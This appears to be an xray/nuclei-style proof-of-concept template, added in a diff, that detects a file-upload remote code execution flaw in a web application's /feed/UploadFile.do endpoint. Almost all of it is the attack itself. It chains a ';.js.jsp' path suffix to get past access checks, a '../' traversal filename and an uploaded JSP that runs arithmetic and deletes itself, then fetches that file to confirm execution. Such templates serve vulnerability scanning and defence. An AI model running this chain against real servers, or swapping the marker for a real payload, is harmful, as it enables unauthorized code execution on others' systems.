@@ -1,0 +1,110 @@
+{
+  "name": "poc-yaml-file-upload-rce",
+  "author": "k3ppf0r",
+  "description": "",
+  "version": "",
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "r1() \u0026\u0026 r2()",
+  "searchQueries": {},
+  "variables": {
+    "rfilename": [
+      "randomLowercase(4)"
+    ],
+    "rboundary": [
+      "randomLowercase(8)"
+    ],
+    "s1": [
+      "randomInt(40000, 44800)"
+    ],
+    "s2": [
+      "randomInt(40000, 44800)"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "r1",
+      "method": "POST",
+      "path": "/feed/UploadFile.do;.js.jsp",
+      "headers": {
+        "Content-Type": "multipart/form-data; boundary\u003d----WebKitFormBoundary{{rboundary}}"
+      },
+      "body": "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name\u003d\"uplo_file\"; filename\u003d\"/../../../../{{rfilename}}.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n\u003c%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%\u003e\r\n------WebKitFormBoundary{{rboundary}}--\r\n",
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 response.body_string.contains(\"\\\"url\\\":\\\"/feed/ShowImage.do\")\u0026\u0026 response.body_string.contains(rfilename)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "r2",
+      "method": "GET",
+      "path": "/{{rfilename}}.jsp;.js.jsp",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "response.status \u003d\u003d 200 \u0026\u0026 response.body_string.contains(string(s1 * s2))"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalFormat": "xray"
+}
